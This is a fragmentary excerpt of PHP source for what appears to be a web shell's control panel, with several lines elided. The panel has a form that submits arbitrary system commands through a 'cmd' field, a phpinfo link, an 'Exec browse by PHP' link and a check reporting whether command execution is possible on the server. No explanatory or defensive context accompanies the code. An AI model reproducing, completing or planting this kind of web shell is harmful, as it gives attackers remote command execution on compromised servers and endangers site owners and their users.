...
<?php
    ...
    if ($action=="cmd") { ?>
     <form name="form1" method="post" action="<?php echo $PHP_SELF ?>?action=cmd">
           <select name="method">
            ...
            <textarea wrap=\"off\" cols="45" rows="10" name="cmd"><?php echo $cmd; ?></textarea>
            <input type="submit" name="Submit" value="<?php echo$method?>">
            <br>
          </form>
    <?php
...
if (!$action) {
?><p align="right"><font size=2><a href="<?php echo $PHP_SELF?>?action=misc&do=phpinfo">phpinfo</a></font></p><?
echo "<pre>";
        if ($mysql_use!="no") {
...
//echo $phpcheck->cmd_method;
?>
<font size=2><a href="<?php echo$PHP_SELF?>?action=cmdbrowse">Exec browse by PHP</a></font>
<?php
if ($phpcheck->cmd_method) {
echo "<font color=\"green\" size=2>[executable] ";  } else { echo "<font color=\"red\" size=2>[not executable]";  }
